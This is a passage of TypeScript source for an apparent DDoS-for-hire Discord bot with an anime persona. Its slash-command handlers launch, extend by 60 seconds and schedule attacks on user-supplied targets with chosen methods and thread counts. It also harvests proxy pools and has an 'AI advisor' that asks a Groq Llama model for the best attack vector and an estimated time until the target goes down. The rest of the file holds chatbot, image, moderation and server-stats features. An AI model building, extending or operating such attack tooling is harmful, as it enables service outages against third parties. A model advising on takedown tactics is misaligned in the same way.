    const lang   = langMatch[2] as "en" | "pt";
    await interaction.deferUpdate();
    try {
      const msgId = interaction.message.id;

      // info
      if (prefix === "info") {
        const data  = await fetchInfoData();
        const embed = buildInfoEmbed({ ...data, lang });
        await interaction.editReply({ embeds: [embed], components: [buildLangRow(lang, "info")] });
        return;
      }

      // analyze
      if (prefix === "analyze") {
        const result = analyzeCache.get(msgId);
        if (!result) { await interaction.editReply({ components: [buildLangRow(lang, "analyze")] }); return; }
        const embed  = buildAnalyzeEmbed(result, lang);
        await interaction.editReply({ embeds: [embed], files: buildGeassFiles(), components: [buildLangRow(lang, "analyze")] });
        return;
      }

      // methods lang toggle
      if (prefix === "methods") {
        const cached = methodsCache.get(msgId);
        if (!cached) { await interaction.editReply({ components: [] }); return; }
        const filtered = cached.layer
          ? cached.methods.filter(m => m.layer?.toLowerCase() === cached.layer?.toLowerCase())
          : cached.methods;
        const total  = Math.ceil(filtered.length / METHODS_PAGE_SIZE);
        const embed  = buildMethodsEmbed(cached.methods, cached.layer, lang, cached.page);
        const navRow = buildMethodsNavRow(cached.page, total, lang);
        methodsCache.set(msgId, { ...cached, lang });
        await interaction.editReply({ embeds: [embed], components: [navRow] });
        return;
      }

      // help
      if (prefix === "help") {
        await interaction.editReply({ embeds: [buildHelpEmbed(lang)], files: buildGeassFiles(), components: [buildLangRow(lang, "help")] });
        return;
      }

      // list
      if (prefix === "list") {
        const cached = listCache.get(msgId);
        if (cached) {
          await interaction.editReply({ embeds: [buildListEmbed(cached, lang)], components: [buildLangRow(lang, "list")] });
        } else {
          const attacks = await api.getAttacks();
          listCache.set(msgId, attacks);
          await interaction.editReply({ embeds: [buildListEmbed(attacks, lang)], components: [buildLangRow(lang, "list")] });
        }
        return;
      }

      // stats
      if (prefix === "stats") {
        const cached = statsCache.get(msgId);
        if (cached) {
          await interaction.editReply({ embeds: [buildStatsEmbed(cached.stats, cached.proxyStats, lang)], components: [buildLangRow(lang, "stats")] });
        } else {
          const [stats, proxyStats] = await Promise.all([api.getStats(), api.getProxyStats().catch(() => undefined)]);
          statsCache.set(msgId, { stats, proxyStats: proxyStats ?? undefined });
          await interaction.editReply({ embeds: [buildStatsEmbed(stats, proxyStats ?? undefined, lang)], components: [buildLangRow(lang, "stats")] });
        }
        return;
      }

      // cluster
      if (prefix === "cluster") {
        const status = await api.getClusterStatus();
        await interaction.editReply({ embeds: [buildClusterEmbed(status, lang)], files: buildGeassFiles(), components: [buildLangRow(lang, "cluster")] });
        return;
      }

      // stop (stateless — just re-build with lang)
      if (prefix === "stop") {
        const descMatch = interaction.message.embeds[0]?.description?.match(/#(\d+)/);
        const id = descMatch ? parseInt(descMatch[1], 10) : 0;
        await interaction.editReply({ embeds: [buildStopEmbed(id, true, lang)], components: [buildLangRow(lang, "stop")] });
        return;
      }

    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("LANG SWITCH FAILED", message)], components: [] });
    }
    return;
  }

  // ── Extend +60s button ────────────────────────────────────────────────────
  if (customId.startsWith("extend_")) {
    const id = parseInt(customId.slice(7), 10);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    try {
      const result = await api.extendAttack(id, 60);
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.GOLD)
            .setTitle("⏱️ ATTACK EXTENDED")
            .setDescription(`Attack **#${id}** extended by **+60 seconds**.\nNew total duration: **${result.duration}s**`)
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
      });
      console.log(`[BUTTON] ${interaction.user.tag} extended attack #${id} +60s`);
    } catch {
      await interaction.editReply({
        embeds: [buildErrorEmbed("EXTEND FAILED", "Attack may have already finished.")],
      });
    }
    return;
  }
}

// ── /schedule handler ──────────────────────────────────────────────────────────
async function handleSchedule(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  if (sub === "list") {
    await interaction.deferReply();
    try {
      const scheduled = await api.getScheduled();
      if (scheduled.length === 0) {
        await interaction.editReply({ embeds: [new EmbedBuilder()
          .setColor(COLORS.GOLD).setTitle("⏰ SCHEDULED ATTACKS").setDescription("Nenhum ataque agendado pendente.")
          .setFooter({ text: AUTHOR }).setTimestamp()] });
        return;
      }
      const fields = scheduled.slice(0, 10).map(s => ({
        name: `${s.method.toUpperCase()} → ${s.target.slice(0, 40)}`,
        value: `ID: \`${s.id}\`\nFire: <t:${Math.floor(s.scheduledFor / 1000)}:R>\nThreads: ${s.threads} | Duration: ${s.duration}s`,
        inline: false,
      }));
      const embed = new EmbedBuilder()
        .setColor(COLORS.CRIMSON).setTitle(`⏰ SCHEDULED ATTACKS — ${scheduled.length} pending`)
        .addFields(fields).setFooter({ text: AUTHOR }).setTimestamp();
      await interaction.editReply({ embeds: [embed] });
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("SCHEDULE LIST FAILED", String(e))] });
    }
    return;
  }

  if (sub === "cancel") {
    const id = interaction.options.getString("id", true);
    await interaction.deferReply();
    try {
      await api.cancelScheduled(id);
      await interaction.editReply({ embeds: [new EmbedBuilder()
        .setColor(COLORS.GOLD).setTitle("✕ SCHEDULED ATTACK CANCELLED")
        .setDescription(`Agendamento \`${id}\` cancelado com sucesso.`)
        .setFooter({ text: AUTHOR }).setTimestamp()] });
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("CANCEL FAILED", String(e))] });
    }
    return;
  }

  // sub === "add"
  const target     = interaction.options.getString("target", true);
  const when       = interaction.options.getString("when", true);
  const method     = interaction.options.getString("method")    ?? "geass-override";
  const duration   = interaction.options.getInteger("duration") ?? 60;
  const threads    = interaction.options.getInteger("threads")  ?? 200;
  const fireDate   = new Date(when);
  if (isNaN(fireDate.getTime()) || fireDate <= new Date()) {
    await interaction.reply({ flags: MessageFlags.Ephemeral, embeds: [buildErrorEmbed("INVALID TIME",
      "Forneça um horário ISO 8601 futuro válido.\nExemplo: `2026-04-17T14:00:00Z`")] });
    return;
  }
  const isHttps = /^https:/i.test(target);
  const port    = isHttps ? 443 : 80;
  await interaction.deferReply();
  try {
    const s = await api.scheduleAttack({ target, port, method, duration, threads, scheduledFor: fireDate.toISOString() });
    const embed = new EmbedBuilder()
      .setColor(COLORS.CRIMSON)
      .setTitle("⏰ ATAQUE AGENDADO — GEASS COMMAND SCHEDULED")
      .setDescription(`> *"The stage is set — the pieces in place. At the appointed hour, my Geass shall be absolute!"*`)
      .addFields(
        { name: "🎯 Target",   value: `\`${target}\``,              inline: true },
        { name: "⚔ Method",   value: `\`${method.toUpperCase()}\``, inline: true },
        { name: "⏱ Fire At",  value: `<t:${Math.floor(fireDate.getTime() / 1000)}:F> (<t:${Math.floor(fireDate.getTime() / 1000)}:R>)`, inline: false },
        { name: "🧵 Threads", value: `${threads}`,                  inline: true },
        { name: "⏳ Duration", value: `${duration}s`,               inline: true },
        { name: "🆔 ID",       value: `\`${s.id}\``,               inline: true },
      )
      .setFooter({ text: `${AUTHOR} • Use /schedule cancel id:${s.id} para cancelar` })
      .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
    console.log(`[SCHEDULE ADD] ${interaction.user.tag} → ${target} at ${fireDate.toISOString()}`);
  } catch (e: unknown) {
    await interaction.editReply({ embeds: [buildErrorEmbed("SCHEDULING FAILED", String(e))] });
  }
}

// ── /advisor handler ──────────────────────────────────────────────────────────
async function handleAdvisor(interaction: ChatInputCommandInteraction): Promise<void> {
  const target = interaction.options.getString("target", true);
  await interaction.deferReply();
  try {
    await interaction.editReply({ embeds: [new EmbedBuilder()
      .setColor(COLORS.CRIMSON)
      .setTitle("🧠 LELOUCH AI ADVISOR — ANALYSING...")
      .setDescription(`> *"Intelligence is the cornerstone of absolute victory."*\n\n⏳ Consultando Groq llama-3.3-70b... analisando \`${target}\`...`)
      .setFooter({ text: AUTHOR })] });

    const advice: AiAdvice = await api.getAiAdvice(target);

    if (advice.error) throw new Error(advice.error);

    const sevColor: Record<string, number> = { critical: 0xC0392B, high: 0xe74c3c, medium: 0xf39c12, low: 0x2ecc71 };
    const color = sevColor[advice.severity ?? "medium"] ?? COLORS.CRIMSON;

    const embed = new EmbedBuilder()
      .setColor(color)
      .setTitle(`🧠 AI ADVISOR — ${(advice.severity ?? "unknown").toUpperCase()} SEVERITY`)
      .setDescription(`**🎯 Target:** \`${target}\`\n**🌐 Status:** HTTP ${advice.targetStatus ?? "?"} — ${advice.latencyMs ?? "?"}ms`)
      .addFields(
        { name: "📊 Analysis",           value: advice.analysis             ?? "N/A", inline: false },
        { name: "⚔ Primary Recommendation", value: advice.primaryRecommendation ?? "N/A", inline: false },
        { name: "🚀 Boost Vector",        value: `\`${advice.boostVector ?? "N/A"}\``,  inline: true  },
        { name: "📈 Effectiveness",       value: `${advice.effectiveness ?? 0}%`,        inline: true  },
        { name: "⏱ Est. Time to Down",   value: advice.estimatedDownIn ?? "Unknown",   inline: true  },
        { name: "💡 Tactical Tip",        value: advice.tip ?? "N/A",                   inline: false },
      )
      .setFooter({ text: `${AUTHOR} • Powered by Groq llama-3.3-70b` })
      .setTimestamp();

    await interaction.editReply({ embeds: [embed] });
    console.log(`[ADVISOR] ${interaction.user.tag} → ${target} | sev=${advice.severity} vec=${advice.boostVector}`);
  } catch (e: unknown) {
    await interaction.editReply({ embeds: [buildErrorEmbed("AI ADVISOR FAILED", String(e))] });
  }
}

// ── /proxy handler ──────────────────────────────────────────────────────────
async function handleProxy(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  if (sub === "refresh") {
    await interaction.deferReply();
    try {
      await api.refreshProxies();
      const embed = new EmbedBuilder()
        .setColor(COLORS.GOLD)
        .setTitle("🔄 PROXY HARVEST INICIADO")
        .setDescription("Re-harvest de proxies disparado — 22 fontes (14 HTTP + 8 SOCKS5) a serem varridas.\nUse `/proxy stats` em ~30s para ver os resultados.")
        .setFooter({ text: AUTHOR }).setTimestamp();
      await interaction.editReply({ embeds: [embed] });
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("PROXY REFRESH FAILED", String(e))] });
    }
    return;
  }

  // sub === "stats"
  await interaction.deferReply();
  try {
    const stats: ProxyStats = await api.getProxyStats();
    const lastFetchAgo = stats.lastFetch > 0 ? `<t:${Math.floor(stats.lastFetch / 1000)}:R>` : "Nunca";
    const freshBadge = stats.fresh ? "✅ FRESH" : stats.fetching ? "⏳ FETCHING..." : "⚠️ STALE";
    const embed = new EmbedBuilder()
      .setColor(stats.count > 50 ? COLORS.CRIMSON : COLORS.GOLD)
      .setTitle(`🌐 PROXY POOL — ${stats.count} LIVE PROXIES`)
      .setDescription(`> *"Every great strategist controls the battlefield — including the network."*`)
      .addFields(
        { name: "📊 Total Live",    value: `**${stats.count}** proxies`,         inline: true },
        { name: "🔵 HTTP",          value: `${stats.httpCount}`,                 inline: true },
        { name: "🟣 SOCKS5",        value: `${stats.socks5Count}`,               inline: true },
        { name: "⚡ Avg Latency",   value: `${stats.avgResponseMs}ms`,           inline: true },
        { name: "🏆 Fastest",       value: stats.fastest ? `${stats.fastest.host}:${stats.fastest.port} (${stats.fastest.responseMs}ms)` : "N/A", inline: true },
        { name: "🔄 Fontes",        value: `${stats.sources.http} HTTP + ${stats.sources.socks5} SOCKS5 = ${stats.sources.total} total`, inline: false },
        { name: "🕐 Último Harvest", value: lastFetchAgo,                        inline: true },
        { name: "📡 Status",         value: freshBadge,                          inline: true },
      )
      .setFooter({ text: `${AUTHOR} • Use /proxy refresh para forçar re-harvest` })
      .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
  } catch (e: unknown) {
    await interaction.editReply({ embeds: [buildErrorEmbed("PROXY STATS FAILED", String(e))] });
  }
}

// ── /lelouch handler ──────────────────────────────────────────────────────────
async function handleLelouch(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  if (sub === "reset") {
    clearLelouchHistory(interaction.user.id);
    const memStats = getLelouchMemoryStats();
    await interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.PURPLE)
          .setTitle("👁️ MEMÓRIA PESSOAL APAGADA")
          .setDescription("*\"Até os reis precisam começar do zero às vezes.\"*\n\nSeu histórico de conversa foi limpo. Minha memória global de **" + memStats.topics + "** tópicos permanece intacta.")
          .setFooter({ text: AUTHOR })
          .setTimestamp(),
      ],
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  if (sub === "memory") {
    const memStats = getLelouchMemoryStats();
    const sessionRemaining = getSessionTimeRemaining(interaction.user.id);
    const sessionMin = sessionRemaining !== null ? Math.ceil(sessionRemaining / 60_000) : null;
    await interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.PURPLE)
          .setTitle("🧠 GEASS KNOWLEDGE BASE — O QUE APRENDI")
          .setDescription(`*"Um estrategista nunca para de aprender. Cada conversa me torna mais formidável."*\n\n**${memStats.topics}** tópicos na base de conhecimento global.`)
          .addFields(
            {
              name: "📚 Assuntos mais discutidos",
              value: memStats.topTopics.length > 0
                ? memStats.topTopics.map((t, i) => `${i + 1}. ${t}`).join("\n")
                : "*Nenhum tópico ainda — use /lelouch ask para começar*",
              inline: false,
            },
            {
              name: "📂 Por categoria",
              value: Object.entries(memStats.byCategory).map(([k, v]) => `\`${k}\`: ${v}`).join(" | ") || "*vazio*",
              inline: false,
            },
            {
              name: "💬 Sessões ativas",
              value: `\`${memStats.activeSessions}\` usuários com histórico na memória` +
                (sessionMin !== null ? `\nSua sessão expira em \`${sessionMin}min\` (TTL 30min)` : "\n*Você não tem sessão ativa*"),
              inline: false,
            },
          )
          .setFooter({ text: `${AUTHOR} • Memória evolui automaticamente com cada conversa` })
          .setTimestamp(),
      ],
    });
    return;
  }

  // ── moderate — Geass Tribunal ─────────────────────────────────────────────
  if (sub === "moderate") {
    const suspect = interaction.options.getUser("user", true);
    const evidence = interaction.options.getString("evidence", true);
    const context  = interaction.options.getString("context") ?? undefined;
    await interaction.deferReply();

    const member = interaction.guild ? await interaction.guild.members.fetch(suspect.id).catch(() => null) : null;
    const targetName = member ? `${suspect.username} (ID: ${suspect.id}, Nickname: ${member.nickname ?? "none"})` : `${suspect.username} (ID: ${suspect.id})`;

    try {
      const verdict = await askLelouchModerate(interaction.user.id, targetName, evidence, context);
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(0x8B0000) // dark red — tribunal
            .setAuthor({ name: "Tribunal do Geass — Lelouch vi Britannia", iconURL: "attachment://geass-symbol.png" })
            .setTitle("⚖️ JULGAMENTO REAL — VEREDITO DO GEASS")
            .setThumbnail(suspect.displayAvatarURL({ size: 256 }))
            .addFields(
              { name: "🎯 Suspeito",         value: `${suspect.username} (<@${suspect.id}>)`, inline: true },
              { name: "👮 Moderador",         value: `${interaction.user.username}`, inline: true },
              { name: "📋 Evidências",        value: evidence.slice(0, 400), inline: false },
              { name: "👑 VEREDICTO REAL",    value: verdict, inline: false },
            )
            .setFooter({ text: `${AUTHOR} • A palavra do rei é lei` })
            .setTimestamp(),
        ],
        files: buildGeassFiles(),
      });
      if (interaction.guildId) {
        const logEmbed = new EmbedBuilder()
          .setColor(0x8B0000)
          .setTitle("⚖️ [LOG] Tribunal do Geass usado")
          .addFields(
            { name: "Moderador", value: `${interaction.user.tag} (<@${interaction.user.id}>)`, inline: true },
            { name: "Suspeito",  value: `${suspect.tag} (<@${suspect.id}>)`,                  inline: true },
            { name: "Evidências", value: evidence.slice(0, 300), inline: false },
          )
          .setTimestamp();
        void sendAdminLog(interaction.guildId, logEmbed);
      }
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("TRIBUNAL FALHOU", msg.slice(0, 300))] });
    }
    return;
  }

  // ── serverstats — Server Intelligence ────────────────────────────────────
  if (sub === "serverstats") {
    await interaction.deferReply();
    const guild = interaction.guild;
    if (!guild) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] });
      return;
    }

    // Fetch all data in parallel
    const [fetchedGuild, bans, invites, webhooks] = await Promise.all([
      guild.fetch(),
      guild.bans.fetch({ limit: 1000 }).catch(() => null),
      guild.invites.fetch().catch(() => null),
      guild.fetchWebhooks().catch(() => null),
    ]);

    const memberCount  = fetchedGuild.memberCount;
    const approxBots   = guild.members.cache.filter(m => m.user.bot).size;
    const approxHumans = guild.members.cache.filter(m => !m.user.bot).size;

    const totalChannels  = guild.channels.cache.size;
    const textChannels   = guild.channels.cache.filter(c => c.type === 0).size;
    const voiceChannels  = guild.channels.cache.filter(c => c.type === 2).size;
    const categories     = guild.channels.cache.filter(c => c.type === 4).size;
    const forumChannels  = guild.channels.cache.filter(c => c.type === 15).size;
    const threads        = guild.channels.cache.filter(c => c.isThread()).size;

    const roleCount      = guild.roles.cache.size - 1; // exclude @everyone
    const emojiCount     = guild.emojis.cache.size;
    const stickerCount   = guild.stickers.cache.size;
    const boostCount     = fetchedGuild.premiumSubscriptionCount ?? 0;
    const boostTier      = fetchedGuild.premiumTier;
    const verifyLevel    = ["Nenhuma", "Baixa", "Média", "Alta", "Altíssima"][fetchedGuild.verificationLevel] ?? "Desconhecida";

    const guildCreated   = Math.floor(fetchedGuild.createdTimestamp / 1000);
    const guildAgeDays   = Math.floor((Date.now() - fetchedGuild.createdTimestamp) / 86_400_000);

    const features = fetchedGuild.features.slice(0, 8).map(f => `\`${f}\``).join(", ") || "*nenhuma*";

    const topRoles = guild.roles.cache
      .filter(r => r.id !== guild.id && r.members.size > 0)
      .sort((a, b) => b.members.size - a.members.size)
      .first(5);

    const totalBans    = bans?.size ?? null;
    const totalInvites = invites?.size ?? null;
    const activeInviteUses = invites?.reduce((a, inv) => a + (inv.uses ?? 0), 0) ?? null;
    const totalWebhooks = webhooks?.size ?? null;

    const BOOST_TIER_LABEL = ["Sem boost", "Tier 1 (2 boosts)", "Tier 2 (15 boosts)", "Tier 3 (30 boosts)"];
    const boostBar = boostCount > 0
      ? "💎".repeat(Math.min(boostCount, 10)) + (boostCount > 10 ? ` +${boostCount - 10}` : "")
      : "*Nenhum boost*";

    await interaction.editReply({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.PURPLE)
          .setAuthor({ name: "Geass Intelligence — Server Dossier", iconURL: "attachment://geass-symbol.png" })
          .setTitle(`👑 ${fetchedGuild.name.toUpperCase()} — INTELIGÊNCIA DO SERVIDOR`)
          .setThumbnail(fetchedGuild.iconURL({ size: 256 }) ?? null)
          .setDescription(`*"Conheço cada canto deste reino. A informação é o poder absoluto do Geass."*`)
          .addFields(
            {
              name: "🪪 IDENTIFICAÇÃO",
              value: [
                `**ID:** \`${fetchedGuild.id}\``,
                `**Owner:** <@${fetchedGuild.ownerId}> (\`${fetchedGuild.ownerId}\`)`,
                `**Criado em:** <t:${guildCreated}:F> (<t:${guildCreated}:R>)`,
                `**Idade:** \`${guildAgeDays}\` dias`,
                `**Verificação:** ${verifyLevel}`,
              ].join("\n"),
              inline: false,
            },
            {
              name: `👥 MEMBROS (${memberCount})`,
              value: [
                `**Total:** \`${memberCount}\``,
                approxHumans > 0 ? `**Humanos:** \`${approxHumans}\`` : null,
                approxBots  > 0 ? `**Bots:** \`${approxBots}\`` : null,
                totalBans  !== null ? `**Banidos:** \`${totalBans}\`` : null,
              ].filter(Boolean).join("\n"),
              inline: true,
            },
            {
              name: `📋 CANAIS (${totalChannels})`,
              value: [
                `💬 Texto: \`${textChannels}\``,
                `🔊 Voz: \`${voiceChannels}\``,
                `📁 Categorias: \`${categories}\``,
                `💬 Fóruns: \`${forumChannels}\``,
                `🧵 Threads: \`${threads}\``,
              ].join("\n"),
              inline: true,
            },
            {
              name: "🎭 ESTRUTURA",
              value: [
                `**Cargos:** \`${roleCount}\``,
                `**Emojis:** \`${emojiCount}\``,
                `**Stickers:** \`${stickerCount}\``,
                totalWebhooks !== null ? `**Webhooks:** \`${totalWebhooks}\`` : null,
                totalInvites  !== null ? `**Convites ativos:** \`${totalInvites}\` (${activeInviteUses ?? 0} usos totais)` : null,
              ].filter(Boolean).join("\n"),
              inline: false,
            },
            {
              name: `💎 BOOST — ${BOOST_TIER_LABEL[boostTier] ?? boostTier}`,
              value: boostBar,
              inline: false,
            },
            {
              name: "🏆 TOP CARGOS POR MEMBROS",
              value: topRoles.length > 0
                ? topRoles.map(r => `<@&${r.id}> — \`${r.members.size}\` membros`).join("\n")
                : "*Nenhum dado disponível*",
              inline: false,
            },
            {
              name: "⚙️ FEATURES DO SERVIDOR",
              value: features,
              inline: false,
            },
          )
          .setImage(fetchedGuild.bannerURL({ size: 1024 }) ?? null)
          .setFooter({ text: `${AUTHOR} • Geass Intelligence Division — Server Dossier` })
          .setTimestamp(),
      ],
      files: buildGeassFiles(),
    });
    return;
  }

  // ── draw — image generation ──────────────────────────────────────────────
  if (sub === "draw") {
    const prompt = interaction.options.getString("prompt", true);
    const style  = interaction.options.getString("style")  ?? "geass";
    const size   = interaction.options.getString("size")   ?? "1024x1024";

    await interaction.deferReply();

    // Lelouch's dramatic reaction while generating
    const thinkingQuotes = [
      "*\"Deixe o Geass pintar o que sua mente não consegue imaginar...\"*",
      "*\"O poder de Geass agora serve a sua visão. Um momento.\"*",
      "*\"Até um rei precisa de tempo para criar obras dignas de Britannia...\"*",
      "*\"O tabuleiro se transforma. A imagem emerge das sombras do Geass.\"*",
    ];
    const quote = thinkingQuotes[Math.floor(Math.random() * thinkingQuotes.length)];

    try {
      const r = await fetch(`${API_BASE}/api/generate-image`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ prompt, style, size }),
        signal: AbortSignal.timeout(90_000), // image gen can take up to 60s
      });

      if (!r.ok) {
        const errBody = await r.json().catch(() => ({ error: r.statusText })) as { error?: string };
        throw new Error(errBody.error ?? `HTTP ${r.status}`);
      }

      const data = await r.json() as {
        b64_json: string;
        prompt: string;
        enhancedPrompt: string;
        revisedPrompt: string | null;
        size: string;
      };

      // Convert base64 to Buffer for Discord attachment
      const imageBuffer = Buffer.from(data.b64_json, "base64");
      const attachment   = new AttachmentBuilder(imageBuffer, { name: "geass-vision.png" });

      const styleLabels: Record<string, string> = {
        geass: "🎌 Code Geass dark anime art",
        realistic: "📸 Fotorrealista",
        minimal: "◾ Minimal",
      };

      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.PURPLE)
            .setAuthor({ name: "Lelouch vi Britannia — Geass Vision", iconURL: "attachment://geass-symbol.png" })
            .setTitle("🎨 GEASS VISION — CRIAÇÃO COMPLETA")
            .setDescription(quote + `\n\n**Prompt:** \`${prompt.slice(0, 200)}\``)
            .addFields(
              { name: "🖼️ Estilo",     value: styleLabels[style] ?? style, inline: true },
              { name: "📐 Resolução",  value: data.size,                    inline: true },
              ...(data.revisedPrompt ? [{
                name: "✨ Prompt refinado pela IA",
                value: data.revisedPrompt.slice(0, 300),
                inline: false,
              }] : []),
            )
            .setImage("attachment://geass-vision.png")
            .setFooter({ text: `${AUTHOR} • /lelouch draw para criar mais` })
            .setTimestamp(),
        ],
        files: [attachment, ...buildGeassFiles()],
      });
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      console.error("[LELOUCH DRAW ERROR]", msg);
      await interaction.editReply({
        embeds: [buildErrorEmbed(
          "GEASS VISION FALHOU",
          msg.includes("content policy") || msg.includes("rejected")
            ? `O Geass rejeitou este prompt por violar as diretrizes de conteúdo.\n\nTente uma descrição diferente.`
            : `O Geass encontrou resistência inesperada.\n\`${msg.slice(0, 200)}\``
        )],
      });
    }
    return;
  }

  // sub === "ask"
  const message = interaction.options.getString("message", true);
  await interaction.deferReply();

  // Build server context for adaptive personality
  const serverCtx = interaction.guild
    ? `${interaction.guild.name}|${interaction.guild.channels.cache.map(c => c.name).slice(0, 20).join(",")}`
    : undefined;

  try {
    const reply = await askLelouch(interaction.user.id, message, serverCtx);

    // Truncate if over Discord 4096 embed limit (use 1900 for description safety)
    const display = reply.length > 1900 ? reply.slice(0, 1897) + "..." : reply;

    await interaction.editReply({
      embeds: [
        new EmbedBuilder()
          .setColor(0x9B59B6)
          .setAuthor({ name: "Lelouch vi Britannia", iconURL: "attachment://geass-symbol.png" })
          .setDescription(display)
          .setFooter({ text: `${AUTHOR} • /lelouch reset para limpar histórico` })
          .setTimestamp(),
      ],
      files: buildGeassFiles(),
    });
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error("[LELOUCH REPLY ERROR]", msg);
    await interaction.editReply({
      embeds: [buildErrorEmbed("GEASS FALHOU", `O Geass encontrou resistência inesperada. Tente novamente.\n\`${msg.slice(0, 200)}\``)],
    });
  }
}

// ── /admin handler ────────────────────────────────────────────────────────────
const LELOUCH_BAN_QUOTES = [
  "*\"You are hereby banished from my kingdom. The Geass has spoken.\"*",
  "*\"By the power of Geass, I banish you to the void. Farewell, pawn.\"*",
  "*\"Britannia has no use for those who defy its order. Be gone.\"*",
  "*\"Your existence in this realm ends here — by my absolute command.\"*",
];
const LELOUCH_MUTE_QUOTES = [
  "*\"Silence. A king need not tolerate the noise of the unworthy.\"*",
  "*\"Your voice has been stripped by Geass. Know your place.\"*",
  "*\"I, Lelouch vi Britannia, command you — speak no more.\"*",
  "*\"The strategy requires silence. You have volunteered.\"*",
];
const LELOUCH_WARN_QUOTES = [
  "*\"Consider this your final warning. My Geass does not issue thirds.\"*",
  "*\"I am watching. My Geass sees all. One more transgression and you are finished.\"*",
  "*\"A pawn that moves out of turn is sacrificed. Remember that.\"*",
];
const LELOUCH_CLEAR_QUOTES = [
  "*\"Erase the evidence of their incompetence. Clean slates are the foundation of strategy.\"*",
  "*\"A battlefield must be clear before the next engagement. Proceed.\"*",
  "*\"History is written by the victors. The rest — deleted.\"*",
];

function getRandQuote(arr: string[]): string {
  return arr[Math.floor(Math.random() * arr.length)];
}

// ── Log channel helper — sends embed to configured mod log channel ────────────
async function sendAdminLog(
  guildId: string,
  embed: EmbedBuilder,
): Promise<void> {
  if (!botClient) return;
  const channelId = getLogChannelId(guildId);
  if (!channelId) return;
  try {
    const ch = await botClient.channels.fetch(channelId);
    if (ch && ch.isTextBased() && "send" in ch) {
      await (ch as import("discord.js").TextChannel).send({ embeds: [embed] });
    }
  } catch (e) {
    console.warn("[LOG CHANNEL]", e instanceof Error ? e.message : e);
  }
}

// ── Universal command logger — logs ALL command usage to mod log channel ────────
async function logCommandUsage(interaction: ChatInputCommandInteraction): Promise<void> {
  if (!interaction.guildId) return;
  const channelId = getLogChannelId(interaction.guildId);
  if (!channelId) return; // no log channel configured — skip silently

  const subcommand = (() => {
    try { return interaction.options.getSubcommand(false); } catch { return null; }
  })();

  const fullCmd = [
    `/${interaction.commandName}`,
    subcommand ? subcommand : null,
  ].filter(Boolean).join(" ");

  const embed = new EmbedBuilder()
    .setColor(0x2C2F33)
    .setTitle("📋 [LOG] Comando usado")
    .addFields(
      { name: "⚡ Comando",  value: `\`${fullCmd}\``,                                           inline: true  },
      { name: "👤 Usuário",  value: `${interaction.user.tag} (<@${interaction.user.id}>)`,        inline: true  },
      { name: "📍 Canal",    value: `<#${interaction.channelId}>`,                                inline: true  },
      { name: "🕒 Horário",  value: `<t:${Math.floor(Date.now() / 1000)}:F>`,                    inline: false },
    )
    .setFooter({ text: `${AUTHOR} • Geass Intelligence Logs` })
    .setTimestamp();

  try {
    if (!botClient) return;
    const ch = await botClient.channels.fetch(channelId);
    if (ch && ch.isTextBased() && "send" in ch) {
      await (ch as import("discord.js").TextChannel).send({ embeds: [embed] });
    }
  } catch { /* non-fatal */ }
}

// ── /whois — GEASS INTELLIGENCE (full investigation) ──────────────────────────

// All Discord permission flags with human descriptions
const PERM_LABELS: Partial<Record<string, string>> = {
  Administrator:             "👑 Administrator",
  ManageGuild:               "🏰 Manage Server",
  ManageRoles:               "🎭 Manage Roles",
  ManageChannels:            "📋 Manage Channels",
  ManageMessages:            "🗑️ Manage Messages",
  ManageWebhooks:            "🔗 Manage Webhooks",
  ManageNicknames:           "📛 Manage Nicknames",
  ManageThreads:             "🧵 Manage Threads",
  ManageEvents:              "📅 Manage Events",
  KickMembers:               "👢 Kick Members",
  BanMembers:                "🔨 Ban Members",
  MuteMembers:               "🔇 Mute Members (Voice)",
  DeafenMembers:             "🔕 Deafen Members",
  MoveMembers:               "↗️ Move Members",
  ModerateMembers:           "⏳ Timeout Members",
  ViewAuditLog:              "📜 View Audit Log",
  MentionEveryone:           "📢 Mention Everyone",
  CreateInstantInvite:       "🔗 Create Invites",
  SendMessages:              "💬 Send Messages",
  SendMessagesInThreads:     "🧵 Send in Threads",
  EmbedLinks:                "🔗 Embed Links",
  AttachFiles:               "📎 Attach Files",
  AddReactions:              "👍 Add Reactions",
  UseExternalEmojis:         "😎 External Emojis",
  UseExternalStickers:       "🖼️ External Stickers",
  UseApplicationCommands:    "⚡ Use Slash Commands",
  UseVAD:                    "🎤 Voice Activity",
  PrioritySpeaker:           "🔊 Priority Speaker",
  Stream:                    "📺 Go Live",
  Connect:                   "🔌 Connect Voice",
  Speak:                     "🗣️ Speak",
  RequestToSpeak:            "✋ Request to Speak",
  ViewChannel:               "👁️ View Channels",
  ReadMessageHistory:        "📚 Read History",
  ChangeNickname:            "✏️ Change Own Nickname",
};

// Flag names → readable badges
const FLAG_MAP: Record<string, string> = {
  Staff:                    "👑 Discord Staff",
  Partner:                  "🤝 Partnered Server Owner",
  Hypesquad:                "🏠 HypeSquad Events Host",
  BugHunterLevel1:          "🐛 Bug Hunter",
  BugHunterLevel2:          "🥇 Bug Hunter Gold",
  HypeSquadOnlineHouse1:    "🟠 HypeSquad Bravery",
